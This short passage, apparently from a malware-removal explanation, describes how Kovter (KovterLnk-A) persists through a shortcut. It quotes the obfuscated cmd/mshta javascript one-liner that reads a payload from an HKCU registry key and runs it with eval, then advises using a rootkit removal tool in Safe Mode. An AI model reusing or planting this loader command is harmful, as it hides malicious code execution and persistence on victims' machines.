Instead, they use a shortcut to launch scripts that address binary strings of code in the Registry. Like this:\n\nC:\\Windows\\System32\\cmd.exe /C start \"\" mshta.exe \"javascript:KtTUE9e=\"w\";cI35=new ActiveXObject(\"WScript.Shell\");YSI5Vhe1O=\"BBNVq\";y3Adm=cI35.RegRead(\"HKCU\\\\software\\\\wmvg\\\\nwjfhxsp\");XZ6XLws=\"WE3S45pc\";eval(y3Adm);CGdL4K=\"X\";\"\n\nKovterLnk-A will restore itself from control servers if not completely defeated. Run a good rootkit removal tool in Safe Mode to kill it. (Malwarebytes Anti-Rootkit Beta, for example) ",
